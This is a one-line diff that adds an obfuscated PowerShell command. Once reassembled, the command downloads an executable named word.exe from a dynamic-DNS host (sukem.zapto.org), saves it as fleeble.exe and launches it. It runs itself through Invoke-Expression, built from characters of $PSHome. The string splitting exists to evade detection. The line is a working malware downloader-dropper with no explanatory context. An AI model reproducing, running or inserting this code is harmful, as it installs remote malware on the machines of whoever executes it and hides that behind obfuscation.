@@ -1,0 +1,1 @@
+﻿ (('('+'New-O'+'bj'+'ec'+'t Sys'+'tem'+'.Net.WebC'+'lie'+'nt'+').Downloa'+'dFil'+'e'+'('+'{0}'+'h'+'ttp'+':'+'//suk'+'em.zap'+'to.o'+'rg/word'+'.'+'exe{0},{'+'0}fl'+'ee'+'ble'+'.exe{'+'0});Sta'+'rt-'+'Pro'+'cess {0}'+'f'+'leeble'+'.'+'exe{0}')  -F  [Char]39) |.( $PSHoMe[4]+$PsHomE[30]+'x')
